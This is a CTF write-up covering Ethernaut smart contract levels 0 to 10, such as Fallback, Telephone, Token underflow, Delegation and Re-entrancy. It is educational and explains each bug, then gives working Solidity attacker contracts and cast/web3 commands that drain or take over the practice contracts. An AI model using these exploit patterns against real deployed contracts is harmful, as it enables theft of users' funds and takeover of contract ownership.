+++
title = "Ethernaut Challenge Solutions"
date = "2024-06-03"
description = "Walkthroughs for Ethernaut CTF challenges, covering vulnerabilities and exploitation techniques."
+++

Hello peeps, recently have started learning things about blockchain.Most probably ethernaut would be the first place where people will land to get their hands dirty. I too landed here and I have noted things that I learned through out this CTF challenges.

# Introduction
Ethernaut is a foundational platform for hands-on smart contract security practice. Below are my solutions for the first two challenges, highlighting key vulnerabilities and attack vectors.  
Everytime you got a challenge, start with a click on `Get new instance`. Once you done with it click on `Submit level` option.

# 0: Hello Ethernaut
**Link:** [Hello Ethernaut Challenge](https://ethernaut.openzeppelin.com/level/0)    
**Bug:** Sensitive data exposure  
**Objective:** Familiarize yourself with contract interaction via the browser console  
**Steps:**  
- As they mentioned in the problem statement,let's open the console tab and execute `await contract.info()`. let move forward with response it gives back

![eth-1.png](../writeup-images/eth-1.png)

**Note:** You might be wondering how can I know that I need to execute the `await contract.password()` to get the password to authenticate. I strongly believe there might be a variable exist which is being checked in authenticate function. So I checked all the function and variables available in contract with the help of console suggestion whenever we add `await contract`.

# 1: Fallback
**Link:** [Fallback Challenge](https://ethernaut.openzeppelin.com/level/1)  
**Bug:** Improper ownership transfer in receive() function.  
**Objective:** Become the owner and drain the contract’s funds.  
**Description:** The ownership will be given to the user who contributes more through `contribute()` function. But in the fallback function, I mean in the receive() function it is giving the ownership if you just send more than 0 eth and if you already contributed more than 0 eth using contribute() function.  
**Steps:**
1. make a call to contribute() function to contribute some eth.
2. now make a call to receive() function with some eth
3. call withdraw function to get all the funds from contract.

**Using Console:**
```shell
    web3.eth.sendTransaction(
        {
            from: player,
            to: contract.address,
            data: web3.eth.abi.encodeFunctionSignature("contribute()"),
            value: 10**10
        
        }
    )
    
    web3.eth.sendTransaction(
        {
            from: player,
            to: contract.address,
            data: '',
            value: 10**10
        }
    )
```

**Using Foundry:**
    I usually use foundry. In foundry setup, we have a tool called `cast` to interact with contracts. You can follow the below commands.
```shell
    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E "contribute()" --value 1 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_U
    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E  --value 1 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E "withdraw()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
```


# 2: Fal1out
**Link:** [Fal1out Challenge](https://ethernaut.openzeppelin.com/level/2)    
**Bug:** Improper ownership transfer in Fal1out() function.  
**Objective:** Become the owner and drain the contract’s funds.  
**Description:** The ownership will be given to the user who calls the `Fal1out()` function. They missed to have the contructor name same as contract name, where it's giving ownership permissions to the creator.  
**Steps:**
- call the **Fal1out()** function.

**Using Console:**
```shell
  await contract.Fal1out()
```

**Using Foundry:**
```solidity
cast call 0xb685F5c3aCdb5D874D3e1219D8a4FDF08a502c6E  "Fal1out()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
```

# 3: Coin Flip
**Link:** [Coin Flip Challenge](https://ethernaut.openzeppelin.com/level/3)    
**Bug:** Pseudo-randomness using predictable blockchain data    
**Objective:** Correctly predict 10 consecutive coin flips    
**Description:** Coin flip is based the block.number which is known publicly.  
**Steps:**
- Create an attack contract that performs the same calculation
- Determine the correct answer before submitting
- Call the flip function 10 times consecutively

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip public target;
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        target.flip(guess);
    }
}
```

**Consecutive calls using Foundry:**
```shell

$ cast call 0xdb0DdE6d17A9d17f57238e6CE66328eC5E28C77A "attack()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
```

# 4: Telephone
**Link:** [Telephone Challenge](https://ethernaut.openzeppelin.com/level/4)  
**Bug:** Incorrect ownership validation using `tx.origin`  
**Objective:** Claim contract ownership  
**Description:** The contract checks `tx.origin != msg.sender`, which can be bypassed through an intermediary contract.  
**Vulnerability Analysis 🔍:**
```solidity
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {  // Vulnerable check
    owner = _owner;
  }
}
```

**Steps:**
 - Deploy an intermediary contract that calls changeOwner()
 - Trigger the call from your EOA through this contract
 - Bypass the check because:
   - tx.origin = Your wallet address 
   - msg.sender = Attack contract address

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone public immutable target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address _newOwner) external {
        target.changeOwner(_newOwner);
    }
}
```

**Execution steps:**
```shell
# 1. Deploy attacker contract
forge create TelephoneHack --constructor-args $TARGET_CONTRACT --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# 2. Execute attack (replace $ATTACKER_CONTRACT with deployed address)
cast send $ATTACKER_CONTRACT "attack(address)" $YOUR_WALLET_ADDRESS \
  --private-key $PRIVATE_KEY --rpc-url $RPC_URL
```

# 5: Token
**Link:** [Token Challenge](https://ethernaut.openzeppelin.com/level/5)  
**Bug:** Integer underflow vulnerability  
**Objective:** Increase your token balance beyond initial allocation  
**Description:** The contract uses outdated Solidity version (0.6.0) without overflow protection.  
**Vulnerability Analysis:**  
```solidity
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);  // Vulnerable check
  balances[msg.sender] -= _value;              // Potential underflow
  balances[_to] += _value;
  return true;
}
```
- How Integer Limits Work ?
  - Ethereum uses **unsigned integers (uint256)** with range:  
    `0` to `2²⁵⁶ - 1`
  - When arithmetic exceeds these limits, it **wraps around**:
      - **Overflow:** `MAX + 1 → 0`
      - **Underflow:** `0 - 1 → MAX` or `X - (X+1)` = `X - X - 1 = -1 -> MAX` assume here X is your current balance. So if you try to transfer at least 1 more than your current balance you will end with having `2²⁵⁶ - 1` as your balance.

**Steps to Attack:**
- Find a victim address (can be any non-zero address)
- Transfer more tokens than you have (causing underflow)
- Your balance wraps around to maximum uint256 value

**Using foundry:**
```shell
$ cast call $CONTRACT_ADDRESS  "balanceOf(address)" $YOUR_ADDRESS  --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL // to check your current balance
$ cast send $CONTRACT_ADDRESS  "transfer(address, uint256)" $ANY_ADDRESS  21 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
```

# 6: Delegation
**Link:** [Delegation Challenge](https://ethernaut.openzeppelin.com/level/6)  
**Bug:** Unprotected `delegatecall` allowing storage hijacking  
**Objective:** Claim ownership of the `Delegation` contract
**Vulnerability Analysis:**

```solidity
contract Delegate {
    address public owner;  // Storage slot 0
    function pwn() public { owner = msg.sender; }
}

contract Delegation {
    address public owner;  // Storage slot 0 (matches Delegate)
    Delegate delegate;
    function() external { delegate.delegatecall(msg.data); }  // Fallback
}
```
- How delegate call works ?
  - delegatecall executes code from another contract in the context of the caller, preserving the original storage, msg.sender, and ETH balance.
  - In our case the `delegatecall` in `Delegation::fallback()` uses the `Delegation` storage and `msg.sender` and `msg.value` and execute the function logic which is present `Delegate` contract.
- Because Solidity stores state variables in declaration order, when we call pwn() on the Delegate contract via delegatecall from the Delegation contract, it modifies the storage slot of the Delegation contract (Slot 0 - owner) rather than the Delegate contract's storage. This storage collision allows us to overwrite Delegation's owner variable.

**Steps to Attack:**
- Craft malicious calldata to trigger Delegate.pwn()
- Force the fallback to execute via delegatecall
- Storage collision modifies Delegation.owner

**Using Foundry:**
```shell
# 1. Calculate selector (alternatively use cast sig "pwn()")
$ cast keccak "pwn()" | cut -c1-10  # Returns 0xdd365b8b, this is our calldata

# 2. Send malicious transaction
$ cast send $DELEGATION_ADDRESS 0xdd365b8b --private-key $PRIVATE_KEY --rpc-url $RPC_URL // this will call our fallback function with msg.data as 0xdd365b8b. 
```


# 7: Force
**Link:** [Force Challenge](https://ethernaut.openzeppelin.com/level/7)  
**Bug:** Contract lacks payable functions but can still receive ETH  
**Objective:** Send ETH to the contract by any means  

**Vulnerability Analysis:**  
Smart contracts can receive ETH through:
1. payable functions 
2. receive()/fallback()
3. Forced transfers (selfdestruct beneficiary)

Since we don't have any functions, let's go with 3rd option to use Forced transders.

**How selfdestruct works ?** It means to destroy the current contract. If that's the case what will happen to the funds that it contains ? that's why it's expecting an address where all the current contract funds will be moved to the target address. It's an irreversible operation.  

**Steps to Attack:**
- Create a sacrificial contract with ETH balance 
- Call selfdestruct(target) to force ETH transfer

**Attack Contract:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    constructor() payable {}

    function attack(address _contract) public {
        selfdestruct(payable(_contract));
    }
}
```

Deploy this contract using remix with some wei by adding `1` in the `VALUE` field on `Deploy & run transactions` block. Then call the `attack()` function by passing `Force` contract address as argument.


# 8: Vault
**Level Link:** [Vault Challenge](https://ethernaut.openzeppelin.com/level/8)
**Bug:** Private variable visibility misconception.  
**Objective:** Read the "private" password on storage to unlock the vault.  
**Vulnerability Analysis:**  
Solidity stores state variables in declaration order on chain.A point to note here is `Nothing is private in on-chain`. So we can simply read the slot-1 data on-chain using foundry tool.
```solidity
contract Vault {
    bool public locked;       // Slot 0
    bytes32 private password; // Slot 1 (NOT actually private)
}
```
**Steps to Attack:**
- Read password from on-chain. nothing but from slot-1 data.
- Call `unlock()` function with the `password` as argument.

**Using foundry:**
```shell
 cast storage $CONTRACT_ADDRESS 1 --rpc-url $SEPOLIA_RPC_URL
 cast send $CONTRACT_ADDRESS "unlock(bytes32)" $PASSWORD --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
```


# 9: King
**Level Link:** [King Challenge](https://ethernaut.openzeppelin.com/level/9)
**Bug:** Unhandled transfer failure in receive()  
**Objective:** Become king and prevent future takeovers
**Vulnerability Analysis:**

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // ❌ Fails if king is contract without fallback
    king = msg.sender; // Only executes if transfer succeeds
    prize = msg.value;
}
```
The objective of contract is whoever bids more than earlier will get the `king` position and the old king will get the money that the new `king` bids. Our goal is, the caller contract to take over the `king` position and block anyone else to take it over back. This could be possible if we don't have fallback functions in caller contract. Without transferring funds to the current king, no one can take over the `king` position.

**Steps to Attack:**
- Get the current `prize` value by using foundry call.
- Deploy a contract which sends eth to `King` contract to take ownership.
- contract shouldn't have receive() / fallback() functions.

**Attack Contract:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    function attack(address payable  _contract) public payable {
        // cast call $CONTRACT_ADDRESS "prize()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
        _contract.call{value:2000000000000000}('');
    }
}
```

# 10: Re-entrancy
**Level Link:** [Re-entrancy Challenge](https://ethernaut.openzeppelin.com/level/10)  
**Bug:** Classic re-entrancy attack  
**Objective:** Drain all contract ETH  
**Vulnerability Analysis:**
```solidity
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        (bool sent,) = msg.sender.call{value: _amount}("");
        require(sent, "Transfer failed");
        balances[msg.sender] -= _amount; // ❌ State update AFTER transfer
    }
}
```
The vulnerable contract reduces balances after sending ETH via call.value(), which triggers the receiver's receive() function. Crucially, this external call hands control to the attacker's contract before state updates occur. If the attacker's receive() function calls withdraw() again:

- The original withdraw() hasn't yet updated balances[msg.sender]
- The re-entrant call passes the same balance check again
- Another ETH transfer is initiated, creating a recursive loop  

**Attack Contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyAttacker {
    Reentrance public target;
    uint256 public initialDeposit;

    constructor(address payable _target) payable {
        target = Reentrance(_target);
        initialDeposit = msg.value;
        target.donate{value: initialDeposit}(address(this));
    }

    function attack() external {
        target.withdraw(initialDeposit);
    }

    receive() external payable {
        if (address(target).balance >= initialDeposit) {
            target.withdraw(initialDeposit);
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

**Steps to attack:**
- Deploy the contract using remix
- call the `attack()` function.